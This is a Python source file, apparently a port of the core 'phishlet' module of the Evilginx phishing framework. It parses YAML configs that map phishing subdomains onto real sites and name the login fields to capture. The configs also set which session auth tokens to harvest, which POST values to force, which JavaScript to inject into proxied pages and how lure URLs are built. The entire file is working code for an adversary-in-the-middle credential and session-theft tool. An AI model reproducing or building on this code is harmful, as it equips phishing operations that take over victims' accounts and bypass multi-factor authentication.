#!/usr/bin/env python3
"""
Evilginx Python Conversion - Core Module
Converted from Go to Python
"""

import os
import re
import json
import yaml
import base64
from typing import Dict, List, Optional, Tuple, Any, Pattern
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin


@dataclass
class ProxyHost:
    phish_subdomain: str
    orig_subdomain: str
    domain: str
    handle_session: bool = False
    is_landing: bool = False
    auto_filter: bool = True


@dataclass
class SubFilter:
    subdomain: str
    domain: str
    mime: List[str]
    regexp: str
    replace: str
    redirect_only: bool = False
    with_params: List[str] = field(default_factory=list)


@dataclass
class AuthToken:
    domain: str
    name: str
    pattern: Optional[Pattern] = None
    http_only: bool = False
    optional: bool = False


@dataclass
class PostField:
    tp: str
    key_s: str
    key: Optional[Pattern] = None
    search: Optional[Pattern] = None


@dataclass
class ForcePostSearch:
    key: Pattern
    search: Pattern


@dataclass
class ForcePostForce:
    key: str
    value: str


@dataclass
class ForcePost:
    path: Pattern
    search: List[ForcePostSearch]
    force: List[ForcePostForce]
    tp: str


@dataclass
class LoginUrl:
    domain: str
    path: str


@dataclass
class JsInject:
    trigger_domains: List[str]
    trigger_paths: List[Pattern]
    trigger_params: List[str]
    script: str


class PhishletVersion:
    def __init__(self, major: int, minor: int, build: int):
        self.major = major
        self.minor = minor
        self.build = build
    
    @classmethod
    def from_string(cls, version_str: str) -> 'PhishletVersion':
        parts = version_str.split('.')
        return cls(
            major=int(parts[0]) if len(parts) > 0 else 0,
            minor=int(parts[1]) if len(parts) > 1 else 0,
            build=int(parts[2]) if len(parts) > 2 else 0
        )
    
    def __str__(self):
        return f"{self.major}.{self.minor}.{self.build}"


class Phishlet:
    def __init__(self, site: str, config: Optional['Config'] = None):
        self.site = site
        self.name = ""
        self.author = ""
        self.version = PhishletVersion(0, 0, 0)
        self.min_version = ""
        self.proxy_hosts: List[ProxyHost] = []
        self.domains: List[str] = []
        self.subfilters: Dict[str, List[SubFilter]] = {}
        self.auth_tokens: Dict[str, List[AuthToken]] = {}
        self.auth_urls: List[re.Pattern] = []
        self.username = PostField(tp="", key_s="")
        self.password = PostField(tp="", key_s="")
        self.landing_path: List[str] = []
        self.cfg = config
        self.custom: List[PostField] = []
        self.force_post: List[ForcePost] = []
        self.login = LoginUrl(domain="", path="/")
        self.js_inject: List[JsInject] = []
    
    def clear(self):
        """Reset all phishlet data"""
        self.name = ""
        self.author = ""
        self.proxy_hosts = []
        self.domains = []
        self.subfilters = {}
        self.auth_tokens = {}
        self.auth_urls = []
        self.username = PostField(tp="", key_s="")
        self.password = PostField(tp="", key_s="")
        self.landing_path = []
        self.custom = []
        self.force_post = []
        self.login = LoginUrl(domain="", path="/")
        self.js_inject = []
    
    def load_from_file(self, site: str, path: str) -> None:
        """Load phishlet configuration from YAML file"""
        self.clear()
        
        with open(path, 'r') as f:
            data = yaml.safe_load(f)
        
        self.name = site
        self.author = data.get('author', '')
        min_ver = data.get('min_ver', '0.0.0')
        self.version = PhishletVersion.from_string(min_ver)
        self.min_version = min_ver
        
        # Version compatibility check
        if not self._is_version_higher_equal(self.version, "2.2.0"):
            raise ValueError("This phishlet is incompatible with current version. Please update to 2.2.0+ format.")
        
        if not self._is_version_higher_equal(self.version, "2.3.0"):
            raise ValueError("This phishlet is incompatible with current version. Please update to 2.3.0+ format.")
        
        # Validate required sections
        if 'proxy_hosts' not in data:
            raise ValueError("Missing `proxy_hosts` section")
        if 'sub_filters' not in data:
            raise ValueError("Missing `sub_filters` section")
        if 'auth_tokens' not in data:
            raise ValueError("Missing `auth_tokens` section")
        if 'credentials' not in data:
            raise ValueError("Missing `credentials` section")
        if 'login' not in data:
            raise ValueError("Missing `login` section")
        
        # Parse proxy hosts
        for ph in data['proxy_hosts']:
            auto_filter = ph.get('auto_filter', True)
            self._add_proxy_host(
                phish_sub=ph.get('phish_sub', ''),
                orig_sub=ph.get('orig_sub', ''),
                domain=ph.get('domain', ''),
                session=ph.get('session', False),
                is_landing=ph.get('is_landing', False),
                auto_filter=auto_filter
            )
        
        if len(self.proxy_hosts) == 0:
            raise ValueError("proxy_hosts list cannot be empty")
        
        # Ensure at least one host handles session
        session_set = any(ph.handle_session for ph in self.proxy_hosts)
        if not session_set:
            self.proxy_hosts[0].handle_session = True
        
        # Ensure at least one host is landing
        landing_set = any(ph.is_landing for ph in self.proxy_hosts)
        if not landing_set:
            self.proxy_hosts[0].is_landing = True
        
        # Parse sub filters
        for sf in data['sub_filters']:
            self._add_sub_filter(
                hostname=sf.get('triggers_on', ''),
                sub=sf.get('orig_sub', ''),
                domain=sf.get('domain', ''),
                mimes=sf.get('mimes', []),
                search=sf.get('search', ''),
                replace=sf.get('replace', ''),
                redirect_only=sf.get('redirect_only', False),
                with_params=sf.get('with_params', [])
            )
        
        # Parse JS inject
        if 'js_inject' in data:
            for js in data['js_inject']:
                self._add_js_inject(
                    trigger_domains=js.get('trigger_domains', []),
                    trigger_paths=js.get('trigger_paths', []),
                    trigger_params=js.get('trigger_params', []),
                    script=js.get('script', '')
                )
        
        # Parse auth tokens
        for at in data.get('auth_tokens', []):
            self._add_auth_tokens(at.get('domain', ''), at.get('keys', []))
        
        # Parse auth URLs
        for au in data.get('auth_urls', []):
            self.auth_urls.append(re.compile(au))
        
        # Parse credentials
        creds = data['credentials']
        if 'username' not in creds:
            raise ValueError("credentials: missing `username` section")
        if 'password' not in creds:
            raise ValueError("credentials: missing `password` section")
        
        username_key = creds['username'].get('key', '')
        username_search = creds['username'].get('search', '')
        self.username.key = re.compile(username_key)
        self.username.search = re.compile(username_search)
        self.username.tp = creds['username'].get('type', 'post')
        self.username.key_s = username_key
        
        password_key = creds['password'].get('key', '')
        password_search = creds['password'].get('search', '')
        self.password.key = re.compile(password_key)
        self.password.search = re.compile(password_search)
        self.password.tp = creds['password'].get('type', 'post')
        self.password.key_s = password_key
        
        # Parse login
        login_data = data['login']
        self.login.domain = login_data.get('domain', '')
        self.login.path = login_data.get('path', '/')
        
        if not self.login.domain:
            raise ValueError("login: `domain` field cannot be empty")
        
        # Validate login domain exists in proxy hosts
        login_domain_ok = False
        for h in self.proxy_hosts:
            check_host = f"{h.orig_subdomain}." if h.orig_subdomain else ""
            check_host += h.domain
            if check_host.lower() == self.login.domain.lower():
                login_domain_ok = True
                break
        
        if not login_domain_ok:
            raise ValueError("login: `domain` must match one of the hostnames defined in `proxy_hosts`")
        
        if not self.login.path.startswith('/'):
            self.login.path = '/' + self.login.path
        
        # Parse custom credentials
        if 'custom' in creds and isinstance(creds['custom'], list):
            for cp in creds['custom']:
                if isinstance(cp, dict):
                    o = PostField(
                        tp=cp.get('type', 'post'),
                        key_s=cp.get('key', ''),
                        key=re.compile(cp.get('key', '')),
                        search=re.compile(cp.get('search', ''))
                    )
                    self.custom.append(o)
        
        # Parse force post
        if 'force_post' in data:
            for op in data['force_post']:
                if not op.get('path'):
                    raise ValueError("force_post: missing or empty `path` field")
                if op.get('type') != 'post':
                    raise ValueError("force_post: unknown type - only 'post' is supported")
                if not op.get('force'):
                    raise ValueError("force_post: missing or empty `force` field")
                
                fpf = ForcePost(
                    path=re.compile(op['path']),
                    search=[],
                    force=[],
                    tp=op['type']
                )
                
                if 'search' in op:
                    for op_s in op['search']:
                        f_s = ForcePostSearch(
                            key=re.compile(op_s.get('key', '')),
                            search=re.compile(op_s.get('search', ''))
                        )
                        fpf.search.append(f_s)
                
                for op_f in op['force']:
                    f_f = ForcePostForce(
                        key=op_f.get('key', ''),
                        value=op_f.get('value', '')
                    )
                    fpf.force.append(f_f)
                
                self.force_post.append(fpf)
        
        # Parse landing path
        if 'landing_path' in data:
            self.landing_path = data['landing_path']
    
    def _is_version_higher_equal(self, v: PhishletVersion, version_str: str) -> bool:
        """Check if version is higher or equal to given version string"""
        other = PhishletVersion.from_string(version_str)
        if v.major > other.major:
            return True
        if v.major < other.major:
            return False
        if v.minor > other.minor:
            return True
        if v.minor < other.minor:
            return False
        return v.build >= other.build
    
    def _add_proxy_host(self, phish_sub: str, orig_sub: str, domain: str, 
                       session: bool, is_landing: bool, auto_filter: bool):
        """Add a proxy host configuration"""
        ph = ProxyHost(
            phish_subdomain=phish_sub,
            orig_subdomain=orig_sub,
            domain=domain,
            handle_session=session,
            is_landing=is_landing,
            auto_filter=auto_filter
        )
        self.proxy_hosts.append(ph)
    
    def _add_sub_filter(self, hostname: str, sub: str, domain: str, mimes: List[str],
                       search: str, replace: str, redirect_only: bool, with_params: List[str]):
        """Add a sub filter configuration"""
        sf = SubFilter(
            subdomain=sub,
            domain=domain,
            mime=mimes,
            regexp=search,
            replace=replace,
            redirect_only=redirect_only,
            with_params=with_params
        )
        if hostname not in self.subfilters:
            self.subfilters[hostname] = []
        self.subfilters[hostname].append(sf)
    
    def _add_auth_tokens(self, domain: str, keys: List[str]):
        """Add authentication token configurations"""
        if domain not in self.auth_tokens:
            self.auth_tokens[domain] = []
        for key in keys:
            token = AuthToken(domain=domain, name=key)
            self.auth_tokens[domain].append(token)
    
    def _add_js_inject(self, trigger_domains: List[str], trigger_paths: List[str],
                      trigger_params: List[str], script: str):
        """Add JavaScript injection configuration"""
        compiled_paths = [re.compile(p) for p in trigger_paths]
        js = JsInject(
            trigger_domains=trigger_domains,
            trigger_paths=compiled_paths,
            trigger_params=trigger_params,
            script=script
        )
        self.js_inject.append(js)
    
    def get_phish_hosts(self) -> List[str]:
        """Get list of phishing hostnames"""
        ret = []
        for h in self.proxy_hosts:
            if self.cfg:
                phish_domain, ok = self.cfg.get_site_domain(self.site)
                if ok:
                    ret.append(self._combine_host(h.phish_subdomain, phish_domain))
        return ret
    
    def get_landing_urls(self, redirect_url: str = "", inc_token: bool = False) -> Tuple[List[str], Optional[Exception]]:
        """Generate landing URLs"""
        ret = []
        host = self.cfg.get_base_domain() if self.cfg else ""
        
        for h in self.proxy_hosts:
            if h.is_landing:
                if self.cfg:
                    phish_domain, ok = self.cfg.get_site_domain(self.site)
                    if ok:
                        host = self._combine_host(h.phish_subdomain, phish_domain)
        
        b64_param = ""
        if redirect_url:
            try:
                parsed = urlparse(redirect_url)
                if not parsed.scheme:
                    return [], ValueError("Invalid redirect URL")
                b64_param = base64.urlsafe_b64encode(redirect_url.encode()).decode()
            except Exception as e:
                return [], e
        
        for u in self.landing_path:
            purl = f"https://{host}{u}"
            if inc_token and self.cfg:
                sep = "?"
                for n in range(len(u) - 1, -1, -1):
                    if u[n] == '/':
                        break
                    elif u[n] == '?':
                        sep = "&"
                        break
                
                purl += f"{sep}{self.cfg.verification_param}={self.cfg.verification_token}"
                if b64_param:
                    from urllib.parse import quote
                    purl += f"&{self.cfg.redirect_param}={quote(b64_param)}"
            
            ret.append(purl)
        
        return ret, None
    
    def get_lure_url(self, path: str) -> str:
        """Generate lure URL"""
        host = self.cfg.get_base_domain() if self.cfg else ""
        for h in self.proxy_hosts:
            if h.is_landing:
                if self.cfg:
                    phish_domain, ok = self.cfg.get_site_domain(self.site)
                    if ok:
                        host = self._combine_host(h.phish_subdomain, phish_domain)
                        break
        return f"https://{host}{path}"
    
    @staticmethod
    def _combine_host(subdomain: str, domain: str) -> str:
        """Combine subdomain and domain"""
        if subdomain:
            return f"{subdomain}.{domain}"
        return domain


if __name__ == "__main__":
    # Test loading a phishlet
    import sys
    
    if len(sys.argv) > 1:
        phishlet_path = sys.argv[1]
        pl = Phishlet("test")
        try:
            pl.load_from_file("test", phishlet_path)
            print(f"Successfully loaded phishlet: {pl.name}")
            print(f"Author: {pl.author}")
            print(f"Version: {pl.version}")
            print(f"Proxy hosts: {len(pl.proxy_hosts)}")
            print(f"Auth tokens: {sum(len(v) for v in pl.auth_tokens.values())}")
        except Exception as e:
            print(f"Error loading phishlet: {e}")
    else:
        print("Usage: python phishlet.py <path_to_yaml_file>")
